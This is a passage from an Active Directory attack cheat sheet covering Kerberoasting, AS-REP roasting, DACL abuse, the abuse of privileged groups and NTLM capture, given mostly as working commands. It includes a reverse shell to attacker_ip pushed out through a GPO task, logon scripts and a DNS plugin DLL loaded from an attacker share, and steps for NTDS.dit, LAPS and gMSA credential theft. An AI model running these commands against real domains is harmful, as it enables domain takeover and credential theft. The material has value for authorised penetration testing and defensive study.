<ul id="bkmrk-perform-a-u2u-reques"><li>Perform a U2U request. The goal is to obtain a ticket for the user than can be decrypted to read the first block of plain text. This block will be used after to form a crackable hash. Retrieve the value of "Block One Plain Text" in the output</li>
</ul><pre id="bkmrk-.%2Frubeus.exe-asktgs--0"><code class="language-powershell">./Rubeus.exe asktgs /u2u /ticket:TGT.kirbi /tgs:TGT.kirbi /nowrap
</code></pre>
<ul id="bkmrk-then%2C-reuse-this-val"><li>Then, reuse this value in the <code>/desplaintext</code> parameter with the <code>describe</code> command</li>
</ul><pre id="bkmrk-.%2Frubeus.exe-describ"><code class="language-powershell">./Rubeus.exe describe /desplaintext:&lt;plain_text&gt; /ticket:&lt;previous_ST&gt;
</code></pre>
<p id="bkmrk-the-kerberoast-hash-">The <code>Kerberoast Hash</code> value in the output can be used with hashcat:</p>
<pre id="bkmrk-hashcat--a-3--m-1400"><code class="language-bash">hashcat -a 3 -m 14000 &lt;kerberoast_hash&gt; -1 charsets/DES_full.charset --hex-charset ?1?1?1?1?1?1?1?1
</code></pre>
<p id="bkmrk-the-obtained-des-key">The obtained DES key can now be used to ask for a TGT for the target account.</p>
<p id="bkmrk-to-exploit-this-agai">To exploit this against a Domain Controller, the DC account UAC must be changed from <code>SERVER_TRUST_ACCOUNT</code> (8192) needs to be changed to <code>WORKSTATION_TRUST_ACCOUNT</code> (4096) (Owner or Write access against the DC account are needed). <strong>This attack can be destructive. It is not recommanded to perform it in production</strong>. Additionally, DES must be activated in the UAC.</p>
<pre id="bkmrk-set-domainobject-%22cn"><code class="language-powershell">Set-DomainObject "CN=DC,OU=Domain Controllers,DC=domain,DC=local" -XOR @{'useraccountcontrol'=12288}
Set-DomainObject "CN=DC,OU=Domain Controllers,DC=domain,DC=local" -XOR @{'useraccountcontrol'=2097152}
</code></pre>
<p id="bkmrk-then%2C-the-attack-can">Then, the attack can be performed as presented above. To rollback to <code>SERVER_TRUST_ACCOUNT</code> an admin account is needed. First escalate to DA, then:</p>
<pre id="bkmrk-set-domainobject-%22cn-0"><code class="language-powershell">Set-DomainObject "CN=DC,OU=Domain Controllers,DC=domain,DC=local" -XOR @{'useraccountcontrol'=12288}
</code></pre>
<h3 id="bkmrk-kerberoast-w%2Fo-creds">Kerberoast w/o creds</h3>
<h4 id="bkmrk-without-pre-authenti">Without pre-authentication</h4>
<p id="bkmrk-if-a-principal-can-a">If a principal can authent without pre-authentication (like AS-REP Roasting), it is possible to use it to launch an <strong>AS-REQ request</strong> (for a TGT) and trick the request to ask for a ST instead for a kerberoastable principal, by modifying the <strong>sname</strong> attribut in the <strong>req-body</strong> part of the request. Full explains <a href="https://www.semperis.com/blog/new-attack-paths-as-requested-sts/">here</a>.</p>
<pre id="bkmrk-.%5Crubeus.exe-kerbero"><code class="language-powershell">.\Rubeus.exe kerberoast /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"user_w/o_preauth" /spn:users.txt
</code></pre>
<h4 id="bkmrk-with-mitm">With MitM</h4>
<p id="bkmrk-if-no-principal-with">If no principal without pre-authentication are present, it is still possible to intercept the <strong>AS-REQ requests</strong> on the wire (with ARP spoofing for example), and replay them to kerberoast.</p>
<p id="bkmrk-warning-%3A-roastinthe"><strong>WARNING : <code>RoastInTheMiddle.exe</code> is only a PoC for the moment, be carefull with it in prod environment !</strong></p>
<pre id="bkmrk-.%2Froastinthemiddle.e"><code class="language-powershell">./RoastInTheMiddle.exe /listenip:&lt;attacker_IP&gt; /spns:users.txt /targets:&lt;target_IP_1&gt;,&lt;target_IP_2&gt; /dcs:&lt;DC_IP_1&gt;,&lt;DC_IP_2&gt;
</code></pre>
<h4 id="bkmrk-combined-with-des">Combined with DES</h4>
<p id="bkmrk-here-are-the-steps-t">Here are the steps to follow to perform the attack, as described by <a href="https://twitter.com/exploitph">Charlie Clark</a>.</p>
<ol id="bkmrk-request-a-valid-tgt-"><li>Request a valid TGT for User1.</li>
<li>Send U2U with User1’s TGT as both authentication and additional tickets to extract known plain text of first block.</li>
<li>Man-in-the-Middle (MitM) is performed.</li>
<li>AS-REQ for Computer1 is captured.</li>
<li>AS-REQ modified to only include the DES-CBC-MD5 etype.</li>
<li>Forward AS-REQ to a DC that supports DES.</li>
<li>Extract TGT for Computer1 from AS-REP.</li>
<li>Send U2U with User1’s TGT as the authentication ticket and Computer1’s TGT as the additional ticket to get an ST encrypted with Computer1’s TGT’s session key.</li>
<li>Create a DES hash from U2U ST encrypted with Computer1’s TGT’s session key.</li>
<li>Create KERB_CRED from Computer1’s TGT and known information, missing the session key.</li>
<li>Crack the DES hash back to the TGT session key.</li>
<li>Insert the TGT session key into the KERB_CRED.</li>
<li>Use the TGT to authenticate as Computer1.</li>
</ol><p id="bkmrk-for-the-moment%2C-this"><strong>For the moment, this version of RoastIntheMiddle doesn't seem available.</strong></p>
<pre id="bkmrk-.%2Froastinthemiddle.e-0"><code class="language-powershell">./RoastInTheMiddle.exe sessionroast /listenip:&lt;attacker_IP&gt; /targets:&lt;target_IP_1&gt;,&lt;target_IP_2&gt; /dcs:&lt;DC_IP_1&gt;,&lt;DC_IP_2&gt; /tgt:&lt;TGT_of_known_user&gt;
</code></pre>
<p id="bkmrk-the-%22hash-des-sessio">The "Hash DES session key" can be cracked with hashcat:</p>
<pre id="bkmrk-hashcat--a-3--m-1400-0"><code class="language-bash">hashcat -a 3 -m 14000 &lt;DES_hash&gt; -1 charsets/DES_full.charset --hex-charset ?1?1?1?1?1?1?1?1
</code></pre>
<p id="bkmrk-and-the-crack-result">And the crack result (which is the DES session key) with the "Kirbi missing session key" can be combined to build a valid TGT:</p>
<pre id="bkmrk-.%2Frubeus.exe-kirbi-%2F"><code class="language-powershell">./Rubeus.exe kirbi /sessionkey:&lt;cracked_session_key&gt; /sessionetype:des /kirbi:&lt;kirbi_w/o_session_key&gt; /nowrap
</code></pre>
<h3 id="bkmrk-as-rep-roasting">AS-REP Roasting</h3>
<h4 id="bkmrk-enumerate-users">Enumerate users</h4>
<pre id="bkmrk-%23upowerview%3A-get-dom"><code class="language-powershell">#UPowerView:
Get-DomainUser -PreauthNotRequired -Verbose

#AD module:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
</code></pre>
<h4 id="bkmrk-request-as-rep-hash">Request AS-REP hash</h4>
<pre id="bkmrk-.%5Crubeus.exe-asrepro"><code class="language-powershell">.\Rubeus.exe asreproast /user:&lt;target&gt; /domain:domain.local /format:hashcat

#To enumerate AS-REP roastable users through LDAP
.\Rubeus.exe asreproast /creduser:"domain.local\user1" /credpassword:"password" /domain:domain.local /format:hashcat
</code></pre>
<p id="bkmrk-it-is-possible-to-fo">It is possible to force DES, if it is allowed:</p>
<pre id="bkmrk-.%5Crubeus.exe-asrepro-0"><code class="language-powershell">.\Rubeus.exe asreproast /user:&lt;target&gt; /domain:domain.local /des /format:hashcat
</code></pre>
<h4 id="bkmrk-disable-kerberos-pre">Disable Kerberos Preauth</h4>
<p id="bkmrk-with-powerview%2C-with">With PowerView, with enough privileges it is possible to perform targeted AS-REP roasting.</p>
<pre id="bkmrk-set-domainobject--id-0"><code class="language-powershell">Set-DomainObject -Identity user1 -XOR @{useraccountcontrol=4194304} -Verbose
Get-DomainUser -PreauthNotRequired -Verbose
</code></pre>
<h4 id="bkmrk-crack-the-hash">Crack the hash</h4>
<p id="bkmrk-with-john-or-hashcat">With <strong>john</strong> or <strong>hashcat</strong> it could be performed.</p>
<p id="bkmrk-in-case-of-des-hash%2C">In case of DES hash, here is the command:</p>
<pre id="bkmrk-hashcat--a-3--m-1400-1"><code class="language-bash">hashcat -a 3 -m 14000 &lt;DES_hash&gt; -1 charsets/DES_full.charset --hex-charset ?1?1?1?1?1?1?1?1
</code></pre>
<h3 id="bkmrk-dacls-attacks">DACLs attacks</h3>
<h4 id="bkmrk-dacls-packages">DACLs packages</h4>
<ul id="bkmrk-owns-object-writedac"><li>
<strong>Owns object</strong>
<ul><li>WriteDacl</li>
</ul></li>
<li>
<strong>GenericAll</strong>
<ul><li>GenericWrite</li>
<li>AllExtendedRights</li>
<li>WriteOwner</li>
</ul></li>
<li>
<strong>GenericWrite</strong>
<ul><li>Self</li>
<li>WriteProperty</li>
</ul></li>
<li>
<strong>AllExtendedRights</strong>
<ul><li>User-Force-Change-Password</li>
<li>DS-Replication-Get-Changes</li>
<li>DS-Replication-Get-Changes-All</li>
<li>DS-Replication-Get-Changes-In-Filtered-Set</li>
</ul></li>
</ul><h4 id="bkmrk-on-any-objects">On any objects</h4>
<h5 id="bkmrk-writeowner">WriteOwner</h5>
<p id="bkmrk-with-this-rights-on-">With this rights on a user it is possible to become the "owner" (<strong>Grant Ownership</strong>) of the account and then change our ACLs against it</p>
<pre id="bkmrk-set-domainobjectowne"><code class="language-powershell">Set-DomainObjectOwner -Identity &lt;target&gt; -OwnerIdentity user1 -verbose
Add-ObjectAcl -TargetIdentity &lt;target&gt; -PrincipalIdentity user1 -Rights ResetPassword

#And change the password
$cred = ConvertTo-SecureString "Password123!" -AsPlainText -force                  
Set-DomainUserPassword -Identity &lt;target&gt; -accountpassword $cred
</code></pre>
<h5 id="bkmrk-writedacl">WriteDacl</h5>
<p id="bkmrk-with-this-rights-we-">With this rights we can modify our ACLs against the target, and give us <strong>GenericAll</strong> for example</p>
<pre id="bkmrk-add-objectacl--targe"><code class="language-powershell">Add-ObjectAcl -TargetIdentity &lt;target&gt; -PrincipalIdentity user1 -Rights All
</code></pre>
<p id="bkmrk-in-case-where-you-ha">In case where you have the right against a container or an OU, it is possible to setup the <strong>Inheritance</strong> flag in the ACE. The child objects will inherite the parent container/OU ACE (except if the object has <code>AdminCount=1</code>)</p>
<pre id="bkmrk-%24guids-%3D-get-domaing"><code class="language-powershell">$Guids = Get-DomainGUIDMap
$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity user1 -Right ExtendedRight,ReadProperty,GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid
$OU = Get-DomainOU -Raw &lt;OU_name&gt;

$dsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()
</code></pre>
<h4 id="bkmrk-on-an-user">On an user</h4>
<h5 id="bkmrk-writeproperty">WriteProperty</h5>
<ul id="bkmrk-shadowcredentials"><li>ShadowCredentials</li>
</ul><pre id="bkmrk-whisker.exe-add-%2Ftar"><code class="language-powershell">Whisker.exe add /target:&lt;target&gt; /domain:domain.local /dc:dc.domain.local /path:C:\path\to\file.pfx /password:"Password123!"
</code></pre>
<ul id="bkmrk-logon-script"><li>Logon Script</li>
</ul><pre id="bkmrk-%23powerview-set-domai"><code class="language-powershell">#PowerView
Set-DomainObject &lt;target&gt; -Set @{'mstsinitialprogram'='\\ATTACKER_IP\rev.exe'} -Verbose

#AD module
Set-ADObject -SamAccountName '&lt;target&gt;' -PropertyName scriptpath -PropertyValue "\\ATTACKER_IP\rev.exe"
</code></pre>
<ul id="bkmrk-targeted-kerberoasti"><li>Targeted Kerberoasting</li>
</ul><p id="bkmrk-we-can-then-request-">We can then request a ST without special privileges. The ST can then be "<strong>Kerberoasted</strong>".</p>
<pre id="bkmrk-%23verify-if-the-user-"><code class="language-powershell">#Verify if the user already has a SPN
Get-DomainUser -Identity &lt;target&gt; | select serviceprincipalname
    #Using ActiveDirectory module
Get-ADUser -Identity &lt;target&gt; -Properties ServicePrincipalName | select ServicePrincipalName
</code></pre>
<p id="bkmrk-new-spn-must-be-uniq"><strong>New SPN must be unique in the domain</strong></p>
<pre id="bkmrk-%23set-the-spn-set-dom"><code class="language-powershell">#Set the SPN
Set-DomainObject -Identity user -Set @{serviceprincipalname='ops/whatever1'}
    #Using ActiveDirectory module
Set-ADUser -Identity user -ServicePrincipalNames @{Add='ops/whatever1'} 

#Request the ticket
Add-Type -AssemblyNAme System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"
    #From PowerView
Request-SPNTicket
</code></pre>
<h5 id="bkmrk-user-force-change-pa">User-Force-Change-Password</h5>
<p id="bkmrk-with-enough-permissi">With enough permissions on a user, we can change his password</p>
<pre id="bkmrk-net-user-%3Ctarget%3E-pa"><code class="language-powershell">net user &lt;target&gt; Password123! /domain

#With PowerView
$pass = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("domain\user1", $pass)
Set-DomainUserPassword "&lt;target&gt;" -AccountPassword $UserPassword -Credential $cred
</code></pre>
<h4 id="bkmrk-on-a-computer">On a computer</h4>
<h5 id="bkmrk-writeproperty-0">WriteProperty</h5>
<ul id="bkmrk-shadowcredentials-0"><li>ShadowCredentials</li>
</ul><pre id="bkmrk-whisker.exe-add-%2Ftar-0"><code class="language-powershell">Whisker.exe add /target:&lt;target&gt; /domain:domain.local /dc:dc.domain.local /path:C:\path\to\file.pfx /password:Password123!
</code></pre>
<ul id="bkmrk-kerberos-rbcd"><li>Kerberos RBCD</li>
</ul><h5 id="bkmrk-allextendedrights">AllExtendedRights</h5>
<ul id="bkmrk-readlapspassword"><li>ReadLAPSPassword</li>
</ul><pre id="bkmrk-%23-with-powerview-get"><code class="language-powershell"># With PowerView
Get-DomainComputer &lt;target&gt;.domain.local -Properties ms-mcs-AdmPwd,displayname,ms-mcs-AdmPwdExpirationTime
</code></pre>
<ul id="bkmrk-readgmsapassword"><li>ReadGMSAPassword</li>
</ul><pre id="bkmrk-.%2Fgmsapasswordreader"><code class="language-powershell">./GMSAPasswordReader.exe --accountname gmsaAccount
</code></pre>
<h4 id="bkmrk-on-a-rodc">On a RODC</h4>
<h5 id="bkmrk-genericwrite">GenericWrite</h5>
<ul id="bkmrk-obtain-local-admin-a"><li>Obtain local admin access</li>
</ul><p id="bkmrk-change-the-managedby">Change the <code>managedBy</code> attribute value and add a controlled user. He will automatically gain admin rights.</p>
<ul id="bkmrk-retrieve-tiers-0-acc"><li>Retrieve Tiers 0 account's NT hashes</li>
</ul><p id="bkmrk-it-is-possible-to-mo">It is possible to modify the <code>msDS-NeverRevealGroup</code> and <code>msDS-RevealOnDemandGroup</code> lists on the RODC to allow Tiers 0 accounts to authenticate, and then forge RODC Golden Tickets for them to access other parts of the AD.</p>
<pre id="bkmrk-%23add-a-domain-admin-"><code class="language-powershell">#Add a domain admin account to the msDS-RevealOnDemandGroup attribute
Set-DomainObject -Identity RODC-Server$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local')}

#If needed, remove the admin from the msDS-NeverRevealGroup attribute
Set-DomainObject -Identity RODC-Server$ -Clear 'msDS-NeverRevealGroup'
</code></pre>
<h5 id="bkmrk-writeproperty-1">WriteProperty</h5>
<p id="bkmrk-writeproperty-on-the"><strong>WriteProperty</strong> on the <code>msDS-NeverRevealGroup</code> and <code>msDS-RevealOnDemandGroup</code> lists is sufficient to modify them. Obtain the <code>krbtgt_XXXXX</code> key is still needed to forge RODC Golden Ticket.</p>
<pre id="bkmrk-%23add-a-domain-admin--0"><code class="language-powershell">#Add a domain admin account to the msDS-RevealOnDemandGroup attribute
Set-DomainObject -Identity RODC-Server$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local')}

#If needed, remove the admin from the msDS-NeverRevealGroup attribute
Set-DomainObject -Identity RODC-Server$ -Clear 'msDS-NeverRevealGroup'
</code></pre>
<h4 id="bkmrk-on-a-group">On a group</h4>
<h5 id="bkmrk-writeproperty%2Fallext">WriteProperty/AllExtendedRights/GenericWrite Self</h5>
<p id="bkmrk-with-one-of-this-rig">With one of this rights we can add a new member to the group</p>
<pre id="bkmrk-net-group-%3Ctarget_gr"><code class="language-powershell">net group &lt;target_group&gt; user1 /add
# With PowerView
Add-DomainGroupMember -Identity '&lt;target_group&gt;' -Members 'user1'
</code></pre>
<h4 id="bkmrk-on-a-gpo">On a GPO</h4>
<h5 id="bkmrk-writeproperty-on-a-g">WriteProperty on a GPO</h5>
<p id="bkmrk-we-can-create-an-%22ev">We can create an "evil" GPO with a scheduled task for example</p>
<pre id="bkmrk-%23with-powerview-new-"><code class="language-powershell">#With PowerView
New-GPOImmediateTask -Verbose -Force -TaskName 'Update' -GPODisplayName 'weakGPO' -Command cmd -CommandArguments "/c net localgroup administrators user1 /add"

#With SharpGPOAbuse
./SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author Administrator --Command "cmd.exe" --Arguments "/c /tmp/nc.exe attacker_ip 4545 -e powershell" --GPOName "weakGPO" 
</code></pre>
<h5 id="bkmrk-createchild-on-polic">CreateChild on Policies Cn + WriteProperty on an OU</h5>
<p id="bkmrk-it-is-possible-to-cr">It is possible to create a fully new GPO and link it to an existing OU</p>
<pre id="bkmrk-%23with-rsat-module-ne"><code class="language-powershell">#With RSAT module
New-GPO -Name "New GPO" | New-GPLink -Target "OU=Workstation,DC=domain,DC=local"
Set-GPPrefRegistryValue -Name "New GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /C \\path\to\payload" -Type ExpandString
</code></pre>
<p id="bkmrk-after-gpo-refresh-on">After GPO refresh on the OU's machines, when the machines will restart the payload will be executed</p>
<h5 id="bkmrk-manage-group-policy-">Manage Group Policy Links</h5>
<p id="bkmrk-this-section-is-pres">This section is presented in the Active Directory - Python edition cheatsheet.</p>
<h4 id="bkmrk-on-an-ou">On an OU</h4>
<h5 id="bkmrk-genericwrite-0">GenericWrite</h5>
<p id="bkmrk-with-at-least-generi">With at least <strong>GenericWrite</strong> on an OU, it it possible to perform the same attacks presented in the GPO section with <strong>Manage Group Policy Links</strong>.</p>
<h4 id="bkmrk-on-the-domain%2Fforest">On the domain/forest</h4>
<h5 id="bkmrk-ds-replication-get-c">DS-Replication-Get-Changes + DS-Replication-Get-Changes-All</h5>
<p id="bkmrk-we-can-dcsync">We can <strong>DCSync</strong></p>
<h5 id="bkmrk-ds-replication-get-c-0">DS-Replication-Get-Changes + DS-Replication-Get-Changes-In-Filtered-Set</h5>
<p id="bkmrk-it-is-possible-to-re">It is possible to realize a <strong>DirSync</strong> attack, as presented <a href="https://simondotsh.com/infosec/2022/07/11/dirsync.html">here</a>.</p>
<pre id="bkmrk-import-module-.%2Fdirs"><code class="language-powershell">Import-Module ./DirSync.psm1

#Sync all the LAPS passwords in the domain
Sync-LAPS

#Sync a specific LAPS password
Sync-LAPS -LDAPFilter '(samaccountname=&lt;computer$&gt;)'

#Sync confidential attributs
Sync-Attributes -LDAPFilter '(samaccountname=user1)' -Attributes unixUserPassword,description
</code></pre>
<h3 id="bkmrk-account-operators">Account Operators</h3>
<p id="bkmrk-the-members-of-this-">The members of this group can add and modify all the non admin users and groups. Since <strong>LAPS ADM</strong> and <strong>LAPS READ</strong> are considered as non admin groups, it's possible to add an user to them, and read the LAPS admin password. They also can manage the <strong>Server Operators</strong> group members which can authenticate on the DC.</p>
<h4 id="bkmrk-add-user-to-laps-gro">Add user to LAPS groups</h4>
<pre id="bkmrk-add-domaingroupmembe"><code class="language-powershell">Add-DomainGroupMember -Identity 'LAPS ADM' -Members 'user1' -Credential $cred -Domain "domain.local"
Add-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -Domain "domain.local"
</code></pre>
<h4 id="bkmrk-read-laps-password">Read LAPS password</h4>
<pre id="bkmrk-get-domaincomputer-%3C"><code class="language-powershell">Get-DomainComputer &lt;computername&gt; -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime
</code></pre>
<h3 id="bkmrk-dnsadmins">DnsAdmins</h3>
<ul id="bkmrk-it-is-possible-for-t"><li>It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).</li>
<li>In case the DC also serves as DNS, this will provide us escalation to DA.</li>
<li>Need privileges to restart the DNS service.</li>
</ul><h4 id="bkmrk-configure-the-dll">Configure the DLL</h4>
<p id="bkmrk-needs-rsat-dns">Needs RSAT DNS</p>
<pre id="bkmrk-%23with-dnscmd.exe-dns"><code class="language-bash">#With dnscmd.exe
dnscmd &lt;target&gt; /config /serverlevelplugindll \\&lt;attacker_IP&gt;\dll\mimilib.dll

#With DNSServer module
$dnsettings = Get-DnsServerSetting -ComputerName &lt;target&gt; -Verbose -All
$dnsettings.ServerLevelPluginDll = "\\&lt;attacker_IP&gt;\dll\mimilib.dll"
Set-DnsServerSetting -InputObject $dnsettings -ComputerName &lt;target&gt; -Verbose
</code></pre>
<h4 id="bkmrk-restart-dns">Restart DNS</h4>
<pre id="bkmrk-sc-%5C%5C%3Ctarget%3E-stop-d"><code class="language-batch">sc \\&lt;target&gt; stop dns
sc \\&lt;target&gt; start dns
</code></pre>
<h3 id="bkmrk-schema-admins">Schema Admins</h3>
<p id="bkmrk-these-group-members-">These group members can change the "<em>schema</em>" of the AD. It means they can change the ACLs on the objects that will be created <strong>IN THE FUTUR</strong>. If we modify the ALCs on the group object, only the futur group will be affected, not the ones that are already present.</p>
<h4 id="bkmrk-change-acls-on-the-g">Change ACLs on the groups</h4>
<p id="bkmrk-give-full-rights-to-">Give full rights to a user on the groups</p>
<pre id="bkmrk-%24creds-%3D-new-object-"><code class="language-powershell">$creds = New-Object System.Management.Automation.PSCredential ("domain.local\user1", (ConvertTo-SecureString "Password" -AsPlainText -Force)); Set-ADObject -Identity "CN=group,CN=Schema,CN=Configuration,DC=domain,DC=local" -Replace @{defaultSecurityDescriptor = 'D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;S-1-5-21-854239470-2015502385-3018109401-52104)';} -Verbose -server dc.domain.local -Credential $creds
</code></pre>
<p id="bkmrk-when-a-new-group-is-">When a new group is created we can add any user to it with the user who has full rights</p>
<pre id="bkmrk-%24user-%3D-get-aduser--"><code class="language-powershell">$User = Get-ADUser -Identity "CN=user1,CN=Users,DC=domain,DC=local"; $Group = Get-ADGroup -Identity "CN=new_admingroup,CN=Users,DC=domain,DC=local"; $creds = New-Object System.Management.Automation.PSCredential ("domain.local\user1", (ConvertTo-SecureString "Password" -AsPlainText -Force)); Add-ADGroupMember -Identity $Group -Members $User -Server dc.domain.local -Credential $creds
</code></pre>
<h3 id="bkmrk-backup-operators">Backup Operators</h3>
<p id="bkmrk-can-generally-log-in">Can <em>generally</em> log in on any machines of the domain.</p>
<h4 id="bkmrk-file-system-backup">File system backup</h4>
<p id="bkmrk-can-backup-the-entir">Can backup the <strong>entire file system</strong> of a machine (DC included) and have full read/write rights on the backup</p>
<p id="bkmrk-to-backup-a-folder-%3A">To backup a folder :</p>
<pre id="bkmrk-robocopy-%2Fb-c%3A%5Cusers"><code class="language-batch">robocopy /B C:\Users\Administrator\Desktop\ C:\tmp\tmp.txt /E
</code></pre>
<p id="bkmrk-to-backup-with-disks">To backup with <strong>Diskshadow + Robocopy</strong>:</p>
<ul id="bkmrk-create-a-script.txt-"><li>Create a <code>script.txt</code> file to backup with Diskshadow</li>
</ul><pre id="bkmrk-set-verbose-onx-set-"><code>set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
</code></pre>
<ul id="bkmrk-backup-with-diskshad"><li>Backup with <code>diskshadow /s script.txt</code>
</li>
<li>Retrieve the backup with <strong>robocopy</strong> and send the NTDS file in the current folder : <code>robocopy /b E:\Windows\ntds . ntds.dit</code>
</li>
<li>Then retrieve the SYSTEM registry hive to decrypt and profit <code>reg save hklm\system c:\temp\system</code>
</li>
</ul><p id="bkmrk-to-backup-with-disks-0">To backup with <strong>Diskshadow + DLLs</strong>:</p>
<ul id="bkmrk-similar-script-for-d"><li>Similar script for Diskshadow</li>
</ul><pre id="bkmrk-set-context-persiste"><code>set context persistent nowritersx
set metadata c:\windows\system32\spool\drivers\color\example.cabx
add volume c: alias someAliasx
createx
expose %someAlias% z:x
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.ditx
delete shadows volume %someAlias%x
resetx
</code></pre>
<ul id="bkmrk-with-these-dlls"><li>With <a href="https://github.com/giuliano108/SeBackupPrivilege">these</a> DLLs</li>
</ul><pre id="bkmrk-import-module-.%5Cseba"><code class="language-powershell">Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll

Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit C:\temp\ntds.dit -Overwrite
reg save HKLM\SYSTEM c:\temp\system.hive
</code></pre>
<h4 id="bkmrk-registry-read-rights">Registry read rights</h4>
<p id="bkmrk-the-backup-operators">The <strong>Backup Operators</strong> can read all the machines registry</p>
<pre id="bkmrk-python3-reg.py-%27doma"><code class="language-bash">python3 reg.py 'domain.local'/'user1':'Password123'@&lt;target&gt;.domain.local query -keyName 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon'

#Backup the SAM, SECURITY and SYSTEM registry keys
reg.py -dc-ip &lt;DC_IP&gt; 'domain.local'/'user1':'Password123'@server.domain.local backup -o \\&lt;attacker_IP&gt;\share
</code></pre>
<h4 id="bkmrk-gpos-read%2Fwrite-righ">GPOs read/write rights</h4>
<p id="bkmrk-normally-the-backup-">Normally the <strong>Backup Operators</strong> can read and rights all the domain and DC GPOs with <strong>robocopy</strong> in <strong>backup</strong> mode</p>
<ul id="bkmrk-found-the-interestin"><li>Found the interesting GPO with <code>Get-NetGPO</code> . For example <strong>Default Domain Policy</strong> in the Domain Controller policy</li>
<li>Get the file at the path <code>\\dc.domain.local\SYSVOL\domain.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</code> and add whatever you want in it</li>
<li>Write the file with <strong>robocopy</strong>:</li>
</ul><pre id="bkmrk-robocopy-%22c%3A%5Ctmp%22-%22%5C"><code class="language-powershell">robocopy "C:\tmp" "\\dc.domain.local\SYSVOL\domain.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit" GptTmpl.inf /ZB
</code></pre>
<h3 id="bkmrk-key-admins">Key Admins</h3>
<p id="bkmrk-members-of-this-grou">Members of this group can perform <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-on-a-computer">Shadow Credentials</a> attacks against any objects, including the domain controllers.</p>
<h3 id="bkmrk-ad-recycle-bin">AD Recycle Bin</h3>
<p id="bkmrk-members-of-this-grou-0">Members of this group can recover deleted objects from the Active Directory, just like in a recycle bin for files, when the feature is enabled. These objects can sometimes have interesting properties. </p>
<h4 id="bkmrk-enumerate-deleted-ob">Enumerate deleted objects</h4>
<p id="bkmrk-to-find-all-the-dele">To find all the deleted objects and their properties:</p>
<pre id="bkmrk-get-adobject--filter"><code class="language-powershell">Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
</code></pre>
<p id="bkmrk-to-focus-on-one-obje">To focus on one object:</p>
<pre id="bkmrk-get-adobject--filter-0"><code class="language-powershell">Get-ADObject -filter { SAMAccountName -eq "user1" } -includeDeletedObjects -property *
</code></pre>
<p id="bkmrk-to-find-the-last-del">To find the last deleted object:</p>
<pre id="bkmrk-get-adobject--ldapfi"><code class="language-powershell">Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" - IncludeDeletedObjects
</code></pre>
<h4 id="bkmrk-restore-an-object">Restore an object</h4>
<pre id="bkmrk-get-adobject--filter-1"><code class="language-powershell">Get-ADObject -Filter {displayName -eq "user1"} IncludeDeletedObjects | Restore-ADObject
</code></pre>
<h2 id="bkmrk-authentication-captu">Authentication capture, coerce and relay</h2>
<h3 id="bkmrk-capture%2C-coerce-and-">Capture, coerce and leak</h3>
<p id="bkmrk-different-ways-to-ob">Different ways to obtain and catch NTLM authentications and retrieve a NTLM response.</p>
<h4 id="bkmrk-responder-%2F-inveigh">Responder / Inveigh</h4>
<p id="bkmrk-change-the-authentic">Change the authentication challenge to <code>1122334455667788</code> in the Responder conf file in order to obtain an easily crackable hash if <strong>NTLMv1</strong> is used.</p>
<pre id="bkmrk-sed--i-%27s%2F-random%2F-1"><code class="language-bash">sed -i 's/ Random/ 1122334455667788/g' Responder/Responder.conf
</code></pre>
<p id="bkmrk-catch-all-the-possib">Catch all the possible hashes on the network (coming via LLMNR, NBT-NS, DNS spoofing, etc):</p>
<pre id="bkmrk-%23-responder-with-wpa"><code class="language-bash"># Responder with WPAD injection, Proxy-Auth, DHCP, DHCP-DNS and verbose
responder -I interface_to_use -wPdDv

# Inveigh with *
Invoke-Inveigh -Challenge 1122334455667788 -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y
</code></pre>
<p id="bkmrk-force-ntlm-downgrade">Force NTLM downgrade to NTLMv1 (will break the authentications if v1 is disabled on the machine):</p>
<pre id="bkmrk-%23---disable-ess-will"><code class="language-bash"># --disable-ess will disable the SSP, not always usefull
responder -I interface_to_use -wdDv --lm --disable-ess
</code></pre>
